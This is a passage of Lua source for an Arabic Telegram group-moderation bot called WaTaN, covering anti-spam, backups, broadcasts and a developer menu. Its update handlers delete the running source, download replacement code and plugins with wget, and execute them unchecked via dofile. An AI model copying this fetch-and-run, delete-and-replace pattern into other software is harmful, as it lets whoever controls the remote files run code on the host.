function AddFileSource(msg,chat,ID_FILE,File_Name)
if File_Name:match('.lua') then
if File_Name ~= "WaTaN.lua" then 
send(chat,msg.id_," ✯︙هذا الملف غير تابع لسورس وطن")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
os.execute('rm -rf WaTaN.lua')
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"* ✯︙عذرا الملف ليس بصيغة {lua} يرجى رفع الملف الصحيح*")
end      
send(chat,msg.id_,"✯︙تم رفع الملف الان ارسل تحديث ليتم تحديث الملف")
end
function AddFile_Bot(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
send(chat,msg.id_," ✯︙ملف نسخه ليس لهذا البوت")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_," ✯︙جاري ...\n✯︙رفع الملف الان")
else
send(chat,msg.id_,"* ✯︙عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
end      
local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
dpMem = 0
for IdMem,v in pairs(groups.UsersList) do
dpMem = dpMem + 1
database:sadd(bot_id..'User_Bot',IdMem)  
end
dpGps = 0
for idg,v in pairs(groups.GP_BOT) do
dpGps = dpGps + 1
database:sadd(bot_id..'Chek:Groups',idg)  
database:set(bot_id..'lock:tagservrbot'..idg,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..idg,'del')    
end
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
database:sadd(bot_id..'Constructor'..idg,idmsh)
end
end
if v.MDER then
for k,idmder in pairs(v.MDER) do
database:sadd(bot_id..'Manager'..idg,idmder)  
end
end
if v.MOD then
for k,idmod in pairs(v.MOD) do
database:sadd(bot_id..'Mod:User'..idg,idmod)  
end
end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
database:sadd(bot_id..'Basic:Constructor'..idg,idASAS)  
end
end
end
send(chat,msg.id_,"\n✯︙تم رفع الملف بنجاح وتفعيل "..dpGps.." مجموعه\n✯︙ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح\n✯︙تم استرجاع "..dpMem.." من المشتركين")
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
if type == 'kick' then 
Text = '\n✯︙العضــو » '..Name..'\n✯︙قام بالتكرار هنا وتم طرده '  
sendText(msg.chat_id_,Text,0,'md')
chat_kick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end 
if type == 'del' then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
end 
if type == 'keed' then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
database:sadd(bot_id..'Tkeed:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '\n✯︙العضــو » '..Name..'\n✯︙قام بالتكرار هنا وتم تقييده '  
sendText(msg.chat_id_,Text,0,'md')
return false  
end  
if type == 'mute' then
Text = '\n✯︙العضــو » '..Name..'\n✯︙قام بالتكرار هنا وتم كتمه '  
sendText(msg.chat_id_,Text,0,'md')
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end
end,nil)   
end  
function plugin_WaTaN(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.WaTaN and msg then
pre_msg = plugin.WaTaN(msg)
end
end
end
send(msg.chat_id_, msg.id_,pre_msg)  
end

----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
function SourceWaTaN(msg,data)
if msg then
local text = msg.content_.text_
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
database:incr(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'GroupBot' 
elseif id:match("^(%d+)") then
database:sadd(bot_id..'User_Bot',msg.sender_user_id_)  
Chat_Type = 'UserBot' 
else
Chat_Type = 'GroupBot' 
end
end
if database:get(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ✯" then   
send(msg.chat_id_, msg.id_," ✯︙تم الغاء الاذاعه")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id.."Chek:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
database:set(bot_id..'Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
send(msg.chat_id_, msg.id_," ✯︙تمت الاذاعه الى *~ "..#list.." ~* كروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if Chat_Type == 'UserBot' then
if text == '/start' or text == '✯ /start ✯' or text == 'رجوع ✯' then  
if DevWaTaN(msg) then
local bl = '✯︙اهلا بك عزيزي المطور\n✯︙اليك اوامر البوت الخاصه بك\n✯︙اختر من الازار في الاسفل\n✯︙قناة سورس البوت [اضغط هنا](t.me/WaTaNTeaM)'
local keyboard = {
{'✯ /start ✯'},
{'قسم الاذاعه ✯','قسم الاحصائيات ✯'},
{'قسم التعطيل والتفعيل ✯','قسم الاشتراك الاجباري ✯'},
{'قسم ضع ~ اضف ~ حذف ✯'},
{'تغير المطور الاساسي ✯','المطور الاساسي ✯'},
{'مطور السورس ✯'},
{'تحديث المتجر ✯','تـحــديـث ✯'},
{'قناة التحديثات ✯','تحديث السورس ✯'},
{'الاصـدار ✯'},
{'المحظورين عام ✯','قائمه الكتم العام ✯'},
{'مسح المحظورين عام ✯','مسح المكتومين عام ✯'},
{'جلب نسخه الاحتياطيه ✯','جلب روابط الكروبات ✯','جلب ملف السورس ✯'},
{'معلومات السيرفر ✯'},
{'الغاء ✯'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
return false
end end
if text == 'قسم التعطيل والتفعيل ✯' then 
if DevWaTaN(msg) then
local bl = '✯︙اهلا بك عزيزي المطور\n✯︙اليك قسم التعطيل والتفعيل\n✯︙اختر من الازرار في الاسفل\n✯︙قناة سورس البوت [اضغط هنا](t.me/WaTaNTeaM)'
local keyboard = {
{'تعطيل التواصل ✯','تفعيل التواصل ✯'},
{'تفعيل البوت الخدمي ✯','تعطيل البوت الخدمي ✯'},
{'تفعيل الاذاعه ✯','تعطيل الاذاعه'},
{'رجوع ✯'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
return false
end end
if text == 'قسم ضع ~ اضف ~ حذف ✯' then 
if DevWaTaN(msg) then
local bl = '✯︙اهلا بك عزيزي المطور\n✯︙اليك قسم ضع ~ اضف ~ حذف\n✯︙اختر من الازرار في الاسفل\n✯︙قناة سورس البوت [اضغط هنا](t.me/WaTaNTeaM)'
local keyboard = {
{'ضع اسم للبوت ✯','ضع كليشه ستارت ✯','حذف كليشه ستارت ✯'},
{'ردود المطور ✯'},
{'اضف رد للكل ✯','حذف رد للكل ✯'},
{'مسح ردود المطور ✯'},
{'رجوع ✯'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
return false
end end
if text == 'قسم الاذاعه ✯' then 
if DevWaTaN(msg) then
local bl = '✯︙اهلا بك عزيزي المطور\n✯︙اليك قسم االا ذاعه\n✯︙اختر من الازرار في الاسفل\n✯︙قناة سورس البوت [اضغط هنا](t.me/WaTaNTeaM)'
local keyboard = {
{'اذاعه ✯','اذاعه بالتثبيت ✯'},
{'اذاعه بالتوجيه ✯','اذاعه بالتوجيه خاص ✯'},
{'اذاعه خاص ✯'},
{'رجوع ✯'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
return false
end end
if text == 'قسم الاحصائيات ✯' then 
if DevWaTaN(msg) then
local bl = '✯︙اهلا بك عزيزي المطور\n✯︙اليك قسم الاحصائيات\n✯︙اختر من الازرار في الاسفل\n✯︙قناة سورس البوت [اضغط هنا](t.me/WaTaNTeaM)'
local keyboard = {
{'الاحصائيات ✯'},
{'المشتركين ✯','الكروبات ✯'},
{'تنظيف الكروبات ✯','تنظيف المشتركين ✯'},
{'المجموعات المدفوعه ✯'},
{'المطورين ✯','الثانويين ✯'},
{'رجوع ✯'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
return false
end end
if text == 'قسم الاشتراك الاجباري ✯' then 
if DevWaTaN(msg) then
local bl = '✯︙اهلا بك عزيزي المطور\n✯︙اليك قسم الاشتراك الاجباري\n✯︙اختر من الازرار في الاسفل\n✯︙قناة سورس البوت [اضغط هنا](t.me/WaTaNTeaM)'
local keyboard = {
{'تعطيل الاشتراك الاجباري','تفعيل الاشتراك الاجباري'},
{'حذف قناة الاشتراك','جلب قناة الاشتراك'},
{'رجوع ✯'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
return false
end end
if text == '/start' then
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
tdcli_function ({ID = "GetUser",user_id_ = SUDO},function(arg,result) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = SUDO,offset_ = 0,limit_ = 1},function(extra,abbas,success) 
local msg_id = msg.id_/2097152/0.5
if not database:get(bot_id..'TEXT_BOT') then
Text = '✯︙اهلا عزيزي\n✯︙انا بوت اسمي '..(database:get(bot_id..'Name:Bot') or 'وطن')..'\n✯︙اختصاصي حمايه الكروبات\n✯︙من تكرار والسبام والتوجيه والخ…\n✯︙لتفعيلي اتبع الاخطوات…↓\n✯︙اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع »{ منشئ او المشرفين } بتفعيل فقط'
else
Text = database:get(bot_id..'TEXT_BOT')
end
if abbas.photos_[0] then
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مطـور البـوت',url="t.me/"..result.username_ or WaTaNTeaM},
{text = 'قناة السورس',url="t.me/WaTaNTeaM"}},
{{text = 'لتنصـيب بـوت',url="https://t.me/WaTaNTeaM/6109"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,Text) 
end
end,nil)
end,nil)
end
if not DevWaTaN(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
send(msg.sender_user_id_, msg.id_,'✯︙تم ارسال رسالتك\n✯︙سيتم رد في اقرب وقت')
tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = '✯︙تم ارسال الملصق من ↓\n - '..Name
sendText(SUDO,Text,0,'md')
end 
end,nil) 
end,nil)
end
if DevWaTaN(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '✯︙المستخدم » '..Name..'\n✯︙تم حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Ban:User_Bot',data.id_)  
return false  
end 
if text =='الغاء الحظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '✯︙المستخدم » '..Name..'\n✯︙تم الغاء حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:srem(bot_id..'Ban:User_Bot',data.id_)  
return false  
end 

tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
if ta.code_ == 400 or ta.code_ == 5 then
local WaTaN_Msg = '\n✯︙قام الشخص بحظر البوت'
send(msg.chat_id_, msg.id_,WaTaN_Msg) 
return false  
end 
if text then    
send(id_user,msg.id_,text)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '✯︙المستخدم » '..Name..'\n✯︙تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end    
if msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '✯︙المستخدم » '..Name..'\n✯︙تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end      
if msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1, nil,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '✯︙المستخدم » '..Name..'\n✯︙تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '✯︙المستخدم » '..Name..'\n✯︙تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = '✯︙المستخدم » '..Name..'\n✯︙تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
end,nil)
end,nil)
end,nil)
end,nil)
end 
if text == 'تفعيل التواصل ✯' and DevWaTaN(msg) then  
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n✯︙تم تفعيل التواصل ' 
else
Text = '\n✯︙بالتاكيد تم تفعيل التواصل '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل ✯' and DevWaTaN(msg) then  
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n✯︙تم تعطيل التواصل' 
else
Text = '\n✯︙بالتاكيد تم تعطيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت الخدمي ✯' and DevWaTaN(msg) then  
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n✯︙تم تفعيل البوت الخدمي ' 
else
Text = '\n✯︙بالتاكيد تم تفعيل البوت الخدمي '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت الخدمي ✯' and DevWaTaN(msg) then  
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n✯︙تم تعطيل البوت الخدمي' 
else
Text = '\n✯︙بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'حذف كليشه ستارت ✯' and ChanSub(msg) and DevWaTaN(msg) then
database:del(bot_id..'TEXT_BOT')
send(msg.chat_id_, msg.id_,'✯︙تم مسح كليشه الستارت')
end
if text == 'ضع كليشه ستارت ✯' and ChanSub(msg) and DevWaTaN(msg) then
database:set(bot_id..'Set:TEXT_BOT'..msg.chat_id_..':'..msg.sender_user_id_,true)
send(msg.chat_id_,msg.id_,'✯︙ارسل الكليشه الان')
return false
end
if text and database:get(bot_id..'Set:TEXT_BOT'..msg.chat_id_..':'..msg.sender_user_id_) then
if text == 'الغاء ✯' and ChanSub(msg) then 
database:del(bot_id..'Set:TEXT_BOT'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'✯︙تم الغاء حفظ كليشة ستارت')
return false
end
database:set(bot_id..'TEXT_BOT',text)
database:del(bot_id..'Set:TEXT_BOT'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'✯︙تم حفظ كليشة ستارت')
return false
end
if text == 'معلومات السيرفر ✯' and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
send(msg.chat_id_, msg.id_, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '⇗ نظام التشغيل ⇖•\n*»» '"$linux_version"'*' 
echo '*———————————~*\n✯✔{ الذاكره العشوائيه } ⇎\n*»» '"$memUsedPrc"'*'
echo '*———————————~*\n✯✔{ وحـده الـتـخـزيـن } ⇎\n*»» '"$HardDisk"'*'
echo '*———————————~*\n✯✔{ الـمــعــالــج } ⇎\n*»» '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
echo '*———————————~*\n✯✔{ الــدخــول } ⇎\n*»» '`whoami`'*'
echo '*———————————~*\n✯✔{ مـده تـشغيـل الـسـيـرفـر }⇎\n*»» '"$uptime"'*'
]]):read('*all'))  
end
if text == 'تحديث السورس ✯' and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
send(msg.chat_id_, msg.id_,'✯︙جارٍ الان تحديث السورس الى اخر اصدار')
os.execute('rm -rf WaTaN.lua')
os.execute('wget https://raw.githubusercontent.com/WaTaNtEaM/WaTaN/main/WaTaN.lua')
send(msg.chat_id_, msg.id_,'✯︙تم تحديث السورس \n✯︙لديك اخر اصدار لسورس وطن\n✯︙الاصدار » { v 3.2 }')
dofile('WaTaN.lua')  
end

if text == 'مطور السورس ✯' and DevWaTaN(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'✯︙اهلا بك عزيزي\n✯︙ان كان لديك استفسار او اي مشكلة\n✯︙يمكنك مراسلة مطور السورس\n✯︙حساب مطور السورس [اضـغـط هـنـا  𓆩•𝐀𝐁𝐁𝐀𝐒 𝐅𝐀𝐃𝐇𝐈𝐋•𓆪  ](t.me/abbasfadhil)')
end

if text == 'تحديث المتجر ✯' and DevWaTaN(msg) then 
io.popen("mkdir File_Bot")
os.execute("rm -fr File_Bot/*")
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/all.lua") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/Reply.lua")  
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/WaTaNtEaM/Files_Watan/main/File_Bot/games.lua") 
send(msg.chat_id_, msg.id_,'✯︙اهلا بك عزيزي\n✯︙تم تنزيل جميع ملفات المتجر وتحديثه الى اخر اصدار\n✯︙تابعنا لتصلك اخر التحديثات\n✯︙[قناة السورس](t.me/WaTaNTeaM)')
dofile('WaTaN.lua')  
end
if text == "تـحــديـث ✯" then
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
dofile("WaTaN.lua")  
send(msg.chat_id_, msg.id_, "✯︙تم تحديث الملفات")
end
if text == "اضف رد للكل ✯" and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
send(msg.chat_id_, msg.id_,"✯︙ارسل الكلمه التي تريد اضافتها")
database:set(bot_id.."Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "حذف رد للكل ✯" and DevWaTaN(msg) then 
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
send(msg.chat_id_, msg.id_,"✯︙ارسل الكلمه التي تريد حذفها")
database:set(bot_id.."Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == ("مسح ردود المطور ✯") and DevWaTaN(msg) then 
local list = database:smembers(bot_id.."List:Rd:Sudo")
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Sudo:Gif"..v)   
database:del(bot_id.."Add:Rd:Sudo:vico"..v)   
database:del(bot_id.."Add:Rd:Sudo:stekr"..v)     
database:del(bot_id.."Add:Rd:Sudo:Text"..v)   
database:del(bot_id.."Add:Rd:Sudo:Photo"..v)
database:del(bot_id.."Add:Rd:Sudo:Video"..v)
database:del(bot_id.."Add:Rd:Sudo:File"..v)
database:del(bot_id.."Add:Rd:Sudo:Audio"..v)
database:del(bot_id.."List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_,"✯︙تم مسح ردود المطور")
end
if text == ("ردود المطور ✯") and DevWaTaN(msg) then 
local list = database:smembers(bot_id.."List:Rd:Sudo")
text = "\n✯︙قائمة ردود المطور \n — — — — — — — — —\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Sudo:Gif"..v) then
db = "متحركه 🎭"
elseif database:get(bot_id.."Add:Rd:Sudo:vico"..v) then
db = "بصمه 📢"
elseif database:get(bot_id.."Add:Rd:Sudo:stekr"..v) then
db = "ملصق 🏷"
elseif database:get(bot_id.."Add:Rd:Sudo:Text"..v) then
db = "رساله ✉"
elseif database:get(bot_id.."Add:Rd:Sudo:Photo"..v) then
db = "صوره 👤"
elseif database:get(bot_id.."Add:Rd:Sudo:Video"..v) then
db = "فيديو 📹"
elseif database:get(bot_id.."Add:Rd:Sudo:File"..v) then
db = "ملف 📁"
elseif database:get(bot_id.."Add:Rd:Sudo:Audio"..v) then
db = "اغنيه 🎵"
end
text = text..""..k.." >> ("..v..") -› {"..db.."}\n"
end
if #list == 0 then
text = "✯︙لا يوجد ردود للمطور"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end
if text == 'المجموعات المدفوعه ✯' and DevWaTaN(msg) then
